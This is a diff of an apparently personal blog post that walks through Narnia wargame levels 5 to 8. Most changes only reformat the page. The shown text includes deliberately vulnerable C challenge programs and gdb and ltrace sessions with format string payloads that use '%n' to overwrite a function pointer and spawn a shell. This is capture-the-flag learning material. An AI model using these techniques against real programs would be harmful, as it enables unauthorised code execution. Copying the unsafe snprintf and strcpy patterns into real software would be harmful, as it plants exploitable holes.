@@ -5,6 +5,7 @@
 		<meta charset="utf-8" />
 		<link rel="profile" href="http://gmpg.org/xfn/11" />
 		<link rel="stylesheet" type="text/css" href="/theme/css/style.css" />
+        <link rel="stylesheet" type="text/css" href="/theme/css/pygments.css" />
 		<link rel='stylesheet' id='oswald-css'  href='http://fonts.googleapis.com/css?family=Oswald&#038;ver=3.3.2' type='text/css' media='all' />
 		<style type="text/css">
 			body.custom-background { background-color: #f5f5f5; }
@@ -51,29 +52,29 @@
 		<div class="entry-content">
 			<p>Carrying on from <a class="reference external" href="http://unlogic.co.uk/2015/04/08/solving-narnia-part1/">Part 1</a></p>
 <div class="section" id="level-05">
-<h2>Level 05 ##</h2>
+<h2>Level 05</h2>
 <pre class="code c literal-block">
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span>
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
-    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-    <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-    <span class="n">buffer</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Change i's value from 1 -&gt; 500. &quot;</span><span class="p">);</span>
+        <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">buffer</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Change i's value from 1 -&gt; 500. &quot;</span><span class="p">);</span>
 
-    <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">500</span><span class="p">){</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;GOOD</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
-    <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">500</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;GOOD</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
 
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;No way...let me give you a hint!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buffer : [%s] (%d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
-    <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;i = %d (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;No way...let me give you a hint!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buffer : [%s] (%d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+        <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;i = %d (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </pre>
 <p>A fixed sized buffer again. This time however trying to overflow it in order to
@@ -133,7 +134,7 @@ i = 528 (0xffffd6cc)</span>
 </pre>
 </div>
 <div class="section" id="level-06">
-<h2>Level 06 ##</h2>
+<h2>Level 06</h2>
 <pre class="code c literal-block">
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
@@ -150,26 +151,26 @@ i = 528 (0xffffd6cc)</span>
 <span class="p">}</span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
-    <span class="kt">char</span> <span class="n">b1</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span> <span class="n">b2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
-    <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">b1</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span> <span class="n">b2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+        <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
 
-    <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s b1 b2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s b1 b2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
 
-    <span class="cm">/* clear environ */</span>
-    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-        <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
-    <span class="cm">/* clear argz    */</span>
-    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-        <span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
+        <span class="cm">/* clear environ */</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+                <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
+        <span class="cm">/* clear argz    */</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+                <span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
 
-    <span class="n">strcpy</span><span class="p">(</span><span class="n">b1</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-    <span class="n">strcpy</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
-    <span class="c1">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)
-</span>    <span class="k">if</span><span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fp</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">==</span> <span class="n">get_sp</span><span class="p">())</span>
-        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-    <span class="n">fp</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">b1</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+        <span class="c1">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)
+</span>        <span class="k">if</span><span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fp</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">==</span> <span class="n">get_sp</span><span class="p">())</span>
+                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">fp</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>
 
-    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
 <span class="p">}</span>
 </pre>
 <p>In this rather complicated looking listing we notice a few things:</p>
@@ -265,7 +266,7 @@ Also note that our <code>segfault</code> is showing us the last
 </pre>
 </div>
 <div class="section" id="level-07">
-<h2>Level 07 ##</h2>
+<h2>Level 07</h2>
 <pre class="code c literal-block">
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
@@ -367,18 +368,18 @@ End of assembler dump.
 <p>So disassmble the <code>vuln</code> function and set a break point just
 before the call of the function pointer. In the process of this challenge
 I learned of a nice way to determine the number of <code>%x</code> you need. Using
-<code>ltrace</code> it's possible to increment the number of <code>%x</code>'s until you
+<code>ltrace</code> it's possible to increment the number of <code>%x</code> 's until you
 see your string in the output again. I'll paste only the correcy output here</p>
-<p>..code:: console</p>
-<blockquote>
-<p><a class="reference external" href="mailto:narnia7&#64;melinda">narnia7&#64;melinda</a>:/narnia$ ltrace ./narnia7 <code>python -c &quot;print 'aaaabbbb' + '%x'*7&quot;</code>
-__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &lt;unfinished ...&gt;
-memset(0xffffd630, '0', 128)                                = 0xffffd630
-printf(&quot;goodfunction() = %pn&quot;, 0x80486e0goodfunction() = 0x80486e0
+<pre class="code console literal-block">
+<span class="gp">narnia7&#64;melinda:/narnia$</span> ltrace ./narnia7 <span class="sb">`</span>python -c <span class="s2">&quot;print 'aaaabbbb' + '%x'*7&quot;</span><span class="sb">`</span>
+<span class="go">__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &lt;unfinished ...&gt;
+memset(0xffffd630, '\0', 128)                                = 0xffffd630
+printf(&quot;goodfunction() = %p\n&quot;, 0x80486e0goodfunction() = 0x80486e0
 )                   = 27
-printf(&quot;hackedfunction() = %pnn&quot;, 0x8048706hackedfunction() = 0x8048706</p>
-<p>)               = 30
-printf(&quot;before : ptrf() = %p (%p)n&quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
+printf(&quot;hackedfunction() = %p\n\n&quot;, 0x8048706hackedfunction() = 0x8048706
+
+)               = 30
+printf(&quot;before : ptrf() = %p (%p)\n&quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
 ) = 41
 puts(&quot;I guess you want to come to the &quot;...I guess you want to come to the hackedfunction...
 )                  = 50
@@ -388,8 +389,8 @@ puts(&quot;Welcome to the goodfunction, but&quot;...Welcome to the goodfunction,
 )                  = 61
 fflush(0xf7fcaac0)                                           = 0
 exit(0 &lt;no return ...&gt;
-+++ exited (status 0) +++</p>
-</blockquote>
++++ exited (status 0) +++</span>
+</pre>
 <p>You can see the <em>aaaa</em> and <em>bbbb</em> at line 14. So we have 7 <code>%x</code> to get the second value.</p>
 <p>Let's take a look at the stack with that input</p>
 <pre class="code console literal-block">
@@ -415,20 +416,20 @@ Breakpoint 1, 0x08048685 in vuln ()
 0xffffd680:     0x00000000      0x00000000      0x00000000      0x00000000</span>
 </pre>
 <p>So at <code>0xffffd60c</code> is the address of <code>goodfunction</code>. We need to overwrite that
-to point to <cite>0x8048706</cite>, our <cite>hackedfunction</cite>. So as before in <a class="reference external" href="http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05">level 05</a>
+to point to <code>0x8048706</code>, our <code>hackedfunction</code>. So as before in <a class="reference external" href="http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05">level 05</a>
 we use <code>%n</code> to try and overwrite this value.</p>
-<pre class="code console literal-block">
-<span class="go">(gdb) r $(python -c &quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'&quot;)
+<pre class="code bash literal-block">
+<span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s2">&quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'&quot;</span><span class="k">)</span>
 
-Starting program: /games/narnia/narnia7 $(python -c &quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'&quot;)
-goodfunction() = 0x80486e0
-hackedfunction() = 0x8048706
+Starting program: /games/narnia/narnia7 <span class="k">$(</span>python -c <span class="s2">&quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'&quot;</span><span class="k">)</span>
+goodfunction<span class="o">()</span> <span class="o">=</span> 0x80486e0
+hackedfunction<span class="o">()</span> <span class="o">=</span> 0x8048706
 
-before : ptrf() = 0x80486e0 (0xffffd60c)
+before : ptrf<span class="o">()</span> <span class="o">=</span> 0x80486e0 <span class="o">(</span>0xffffd60c<span class="o">)</span>
 I guess you want to come to the hackedfunction...
 
-Breakpoint 1, 0x08048685 in vuln ()
-(gdb) x/40wx $esp
+Breakpoint 1, 0x08048685 in vuln <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span> x/40wx <span class="nv">$esp</span>
 0xffffd5f0:     0xffffd610      0x00000080      0xffffd8a2      0x08048238
 0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x0000002f
 0xffffd610:     0x61616161      0xffffd60c      0x38343038      0x66383332
@@ -439,11 +440,10 @@ Breakpoint 1, 0x08048685 in vuln ()
 0xffffd660:     0x00000000      0x00000000      0x00000000      0x00000000
 0xffffd670:     0x00000000      0x00000000      0x00000000      0x00000000
 0xffffd680:     0x00000000      0x00000000      0x00000000      0x00000000
-(gdb)</span>
 </pre>
 <p>The value of <em>2f</em> at <code>0xffffd60c</code> shows us that our overwrite was successful
-and we wrote the value of <em>47</em>. We need to write <code>0x8048706</code> which is <em>134514438</em> in decimal.
-So let's add our <code>%d</code> in and remember to adjust the number of <code>%x</code> s too, so we can see
+and we wrote the value of <em>47</em>. We need to write <code>0x8048706</code> which is <code>134514438</code> in decimal.
+So let's add our <code>%d</code> in and remember to adjust the number of <code>%x</code>s too, so we can see
 how much padding we need</p>
 <pre class="code console literal-block">
 <span class="go">(gdb) r $(python -c &quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%d%n'&quot;)
@@ -551,39 +551,39 @@ Way to go!!!!$ whomai
 <p>Notice that the address of <code>ptrf</code> is not the same in the shell :)</p>
 </div>
 <div class="section" id="level-08">
-<h2>Level 08 ##</h2>
-<!-- code: c
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-// gcc's variable reordering fucked things up
+<h2>Level 08</h2>
+<pre class="code c literal-block">
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="c1">// gcc's variable reordering fucked things up
 // to keep the level in its old style i am
-// making "i" global unti i find a fix
+// making &quot;i&quot; global unti i find a fix
 // -morla
-int i;
+</span><span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
 
-void func(char *b){
-    char *blah=b;
-    char bok[20];
-    //int i=0;
+<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">blah</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">bok</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+    <span class="c1">//int i=0;
+</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">bok</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bok</span><span class="p">));</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">bok</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
 
-    memset(bok, '\0', sizeof(bok));
-    for(i=0; blah[i] != '\0'; i++)
-        bok[i]=blah[i];
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">bok</span><span class="p">);</span>
+<span class="p">}</span>
 
-    printf("%s\n",bok);
-}
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
 
-int main(int argc, char **argv){
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="k">else</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
 
-    if(argc > 1)
-        func(argv[1]);
-    else
-    printf("%s argument\n", argv[0]);
-
-    return 0;
-} -->
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre>
 <p>I'm struggling with this, and rather than delay the whole post because of the last
 level, I decided to post anyway. I'll update this when I have this figured out.</p>
 <p>Sorry.</p>
